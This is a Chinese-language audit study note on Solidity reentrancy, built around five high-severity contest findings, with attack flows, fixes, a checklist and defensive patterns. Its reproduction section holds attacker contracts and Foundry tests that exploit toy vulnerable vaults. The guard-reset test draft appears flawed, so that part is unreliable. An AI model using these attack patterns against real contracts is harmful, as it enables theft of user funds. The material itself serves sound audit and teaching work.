# Reentrancy Vulnerability Patterns

> 來源：Code4rena, Sherlock 2023-2024 審計報告
> 整理：5 個 High Severity 案例

## Overview

Reentrancy 是最經典的智能合約漏洞。攻擊者利用外部調用的 callback 機制，在狀態更新前重入合約。

---

## 1. Reentrancy Guard Reset (Wise Lending 2024-02) ⭐ 新型

**來源：** [Code4rena H-01](https://code4rena.com/reports/2024-02-wise-lending)

**問題：** `receive()` 函數意外重置了 reentrancy guard。

**漏洞代碼：**
```solidity
// receive() 會觸發 _sendValue，重置 sendingProgress
receive() external payable {
    if (msg.sender != WETH_ADDRESS) {
        _sendValue(master, msg.value);
    }
}

function _sendValue(address _recipient, uint256 _amount) internal {
    sendingProgress = true;  // 設置 guard
    
    (bool success,) = payable(_recipient).call{value: _amount}("");
    
    sendingProgress = false; // ❌ 重置 guard！
}
```

**攻擊流程：**
1. 攻擊者調用 `withdrawExactAmountETH()`
2. 在 callback 中，發送少量 ETH 到合約觸發 `receive()`
3. `receive()` 調用 `_sendValue()`，重置 `sendingProgress = false`
4. Reentrancy guard 失效，攻擊者可重入任何函數
5. 調用 `paybackBadDebtForToken()` 清除自己的債務並獲得獎勵

**修復：**
```solidity
function _sendValue(...) internal {
    _checkReentrancy(); // 先檢查 guard
    sendingProgress = true;
    // ...
}
```

**教訓：** Reentrancy guard 的設置/重置邏輯必須在所有路徑上一致。

---

## 2. ERC721 Callback Reentrancy (AI Arena 2024-02)

**來源：** [Code4rena H-830](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/830)

**問題：** `claimRewards()` 在 mint NFT 時可被 `onERC721Received` callback 重入。

**漏洞代碼：**
```solidity
function claimRewards(...) external {
    uint32 lowerBound = numRoundsClaimed[msg.sender]; // ← 從 storage 讀取
    
    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
        numRoundsClaimed[msg.sender] += 1; // ← 更新 storage
        
        // ...
        _fighterFarmInstance.mintFromMergingPool(msg.sender, ...);
        // ↑ 觸發 onERC721Received callback，可以重入！
    }
}
```

**攻擊流程：**
1. 攻擊者累積 2 個獎勵
2. 調用 `claimRewards()`，第一個 mint 觸發 callback
3. 在 callback 中再次調用 `claimRewards()`
4. 由於 `numRoundsClaimed` 已更新，重入的調用 claim 剩餘獎勵
5. 原始調用繼續，又 mint 一個
6. 結果：2 個獎勵 → 3 個 NFT

**指數級放大：**
| 獎勵數 | 額外 mint | 總計 |
|--------|-----------|------|
| 2 | 1 | 3 |
| 3 | 3 | 6 |
| 4 | 6 | 10 |
| 5 | 10 | 15 |

**修復：** 加入 `nonReentrant` modifier 或使用 CEI pattern。

---

## 3. onERC721Received State Manipulation (Revert Lend 2024-03)

**來源：** [Code4rena H-323](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/323)

**問題：** 在 transformation 過程中，`_cleanupLoan` 先於 `_updateAndCheckCollateral` 執行。

**漏洞代碼：**
```solidity
function onERC721Received(...) external override returns (bytes4) {
    // ...
    if (tokenId != oldTokenId) {
        loans[tokenId] = Loan(loans[oldTokenId].debtShares);
        
        // ❌ 先清理舊 loan（會發送 NFT 回用戶）
        _cleanupLoan(oldTokenId, ...); // 觸發 callback
        
        // 之後才更新新 token 的狀態
        _updateAndCheckCollateral(tokenId, ..., 0, loans[tokenId].debtShares);
    }
}
```

**攻擊流程：**
1. Bob 進行 AutoRange transformation
2. `_cleanupLoan` 發送舊 NFT 回 Bob
3. Bob 在 `onERC721Received` callback 中調用 `borrow()` 增加債務
4. `borrow()` 調用 `_updateAndCheckCollateral` 更新 debt shares
5. 原始調用繼續，再次調用 `_updateAndCheckCollateral`
6. 結果：`totalDebtShares` 被錯誤增加兩次

**影響：** 可導致其他用戶無法借款（DoS）。

**修復：** 遵循 CEI pattern，先完成所有狀態更新再發送 NFT。

---

## 4. Read-Only Reentrancy (Blueberry 2023-04) ⭐ 進階

**來源：** [Sherlock H-141](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/141)

**問題：** View 函數讀取了處於不一致狀態的數據。

**背景：** Balancer Vault 的 `joinPool` 會先更新 BPT supply，再更新 token balances。

**漏洞代碼：**
```solidity
function getPrice() public view returns (uint256) {
    // 獲取 token balances
    (tokens, balances,) = vault.getPoolTokens(poolId);
    
    // 獲取 BPT supply
    uint256 supply = pool.totalSupply();
    
    // 計算價格
    return f(balances) / supply;
    // ❌ 如果在 joinPool 中間被調用，balances 是舊的但 supply 是新的！
}
```

**攻擊流程：**
1. 攻擊者 flashloan 大量 token
2. 調用 `BalancerVault.joinPool()`
3. Vault 更新 BPT supply 後，發送多餘 ETH 回攻擊者
4. 在 `receive()` callback 中調用 `liquidate()`
5. `liquidate()` 調用 `getPrice()`
6. 由於 balances 未更新但 supply 已增加，價格被低估
7. 無辜用戶被錯誤清算

**真實案例：** Sentiment 被黑 $1M

**修復：**
```solidity
// 調用 Balancer 的 reentrancy guard 檢查
VaultReentrancyLib.ensureNotInVaultContext(vault);
```

---

## 5. ERC1155 Rental Hijack (reNFT 2024-01)

**來源：** [Code4rena H-588](https://github.com/code-423n4/2024-01-renft-findings/issues/588)

**問題：** ERC1155 `safeTransferFrom` 觸發 `onERC1155Received` callback。

**漏洞代碼：**
```solidity
// Seaport 使用 safeTransferFrom 轉移 ERC1155
// 這會觸發接收方的 onERC1155Received callback
conduit.safeTransferFrom(from, to, tokenId, amount, data);
// ↑ 在租賃設置完成前就觸發 callback
```

**攻擊流程：**
1. 攻擊者租借 ERC1155 token
2. Seaport 調用 `safeTransferFrom` 發送 token 到 rental safe
3. 在 `onERC1155Received` callback 中，rental 尚未完全設置
4. 攻擊者利用這個時機將 token 轉移出去
5. 結果：攻擊者免費獲得 NFT

**修復：** 確保狀態完全設置後再進行 token 轉移。

---

## Minimal Reproductions

### Pattern 1: Reentrancy Guard Reset — Minimal Reproduction

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableVault {
    bool public sendingProgress;
    mapping(address => uint256) public balances;
    address public master;

    constructor() { master = msg.sender; }

    receive() external payable {
        if (msg.sender != address(0)) _sendValue(master, msg.value);
    }

    function _sendValue(address to, uint256 amt) internal {
        sendingProgress = true;
        (bool ok,) = payable(to).call{value: amt}("");
        sendingProgress = false; // ❌ resets guard
    }

    function deposit() external payable { balances[msg.sender] += msg.value; }

    function withdraw(uint256 amt) external {
        require(!sendingProgress, "reentrant");
        sendingProgress = true;
        require(balances[msg.sender] >= amt);
        balances[msg.sender] -= amt;
        (bool ok,) = msg.sender.call{value: amt}("");
        sendingProgress = false;
    }
}

contract GuardResetAttacker {
    VulnerableVault public vault;
    uint256 public count;

    constructor(VulnerableVault _v) { vault = _v; }

    receive() external payable {
        // Send 1 wei to vault to trigger receive() → resets guard
        if (count < 1) {
            count++;
            payable(address(vault)).call{value: 1}("");
            vault.withdraw(1 ether); // re-enter after guard reset
        }
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }
}
```

### Pattern 1: Foundry Test Draft

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// paste VulnerableVault and GuardResetAttacker above

contract GuardResetTest is Test {
    VulnerableVault vault;
    GuardResetAttacker attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new GuardResetAttacker(vault);
        // Seed vault with funds
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
    }

    function testGuardResetReentrancy() public {
        vm.deal(address(attacker), 2 ether);
        uint256 pre = address(attacker).balance;
        attacker.attack();
        assertGt(address(attacker).balance, pre, "attacker should profit");
    }
}
```

### Pattern 2: ERC721 Callback Reentrancy — Minimal Reproduction

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract SimpleNFT is ERC721 {
    uint256 public nextId;
    constructor() ERC721("T", "T") {}
    function mint(address to) external returns (uint256) {
        uint256 id = nextId++;
        _safeMint(to, id);
        return id;
    }
}

contract VulnerableRewards {
    SimpleNFT public nft;
    mapping(address => uint32) public claimed;
    mapping(address => uint32) public totalRewards;

    constructor(SimpleNFT _nft) { nft = _nft; }

    function setRewards(address u, uint32 r) external { totalRewards[u] = r; }

    function claimRewards() external {
        uint32 start = claimed[msg.sender];
        for (uint32 i = start; i < totalRewards[msg.sender]; i++) {
            claimed[msg.sender] += 1;
            nft.mint(msg.sender); // triggers onERC721Received → reentrant
        }
    }
}

contract ERC721Attacker {
    VulnerableRewards public target;
    uint256 public minted;

    constructor(VulnerableRewards _t) { target = _t; }

    function attack() external { target.claimRewards(); }

    function onERC721Received(address, address, uint256, bytes calldata)
        external returns (bytes4)
    {
        minted++;
        if (target.claimed(address(this)) < target.totalRewards(address(this))) {
            target.claimRewards();
        }
        return this.onERC721Received.selector;
    }
}
```

### Pattern 2: Foundry Test Draft

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// paste SimpleNFT, VulnerableRewards, ERC721Attacker above

contract ERC721ReentrancyTest is Test {
    SimpleNFT nft;
    VulnerableRewards rewards;
    ERC721Attacker attacker;

    function setUp() public {
        nft = new SimpleNFT();
        rewards = new VulnerableRewards(nft);
        attacker = new ERC721Attacker(rewards);
        rewards.setRewards(address(attacker), 3);
    }

    function testERC721Reentrancy() public {
        attacker.attack();
        // With 3 rewards, reentrancy should yield > 3 NFTs
        assertGt(attacker.minted(), 3, "should mint more than entitled");
    }
}
```

---

## Reentrancy 類型總結

| 類型 | 觸發機制 | 案例 |
|------|----------|------|
| Classic | `call{value}()` | DAO Hack |
| ERC721 Callback | `onERC721Received` | AI Arena, Revert |
| ERC1155 Callback | `onERC1155Received` | reNFT |
| ERC777 Callback | `tokensReceived` | imBTC hack |
| Read-Only | view 函數讀取不一致狀態 | Blueberry |
| Guard Reset | Guard 被意外重置 | Wise Lending |

---

## 審計 Checklist

| # | 檢查項目 | 嚴重性 |
|---|---------|--------|
| 1 | 外部調用後是否有狀態更新？ | Critical |
| 2 | 是否有 nonReentrant guard？ | High |
| 3 | Guard 是否在所有路徑上一致？ | High |
| 4 | ERC721/1155 mint/transfer 是否用 safe 版本？ | High |
| 5 | View 函數是否讀取可能不一致的狀態？ | High |
| 6 | 是否整合了有 callback 機制的協議？(Balancer, Curve) | Medium |
| 7 | 是否遵循 CEI pattern？ | High |

---

## 防禦模式

### 1. Check-Effects-Interactions (CEI)
```solidity
function withdraw(uint amount) external {
    // Check
    require(balances[msg.sender] >= amount);
    
    // Effect
    balances[msg.sender] -= amount;
    
    // Interaction
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}
```

### 2. ReentrancyGuard
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MyContract is ReentrancyGuard {
    function withdraw() external nonReentrant {
        // ...
    }
}
```

### 3. Transient Storage Guard (EIP-1153)
```solidity
// 更省 gas 的 reentrancy guard
import "@openzeppelin/contracts/utils/ReentrancyGuardTransient.sol";
```

---

## 參考資源

- [Cyfrin Solodit Checklist - Reentrancy](https://www.cyfrin.io/blog/solodit-checklist-explained-8-reentrancy-attack)
- [Balancer Read-Only Reentrancy Disclosure](https://forum.balancer.fi/t/reentrancy-vulnerability-scope-expanded/4345)
- [OpenZeppelin ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
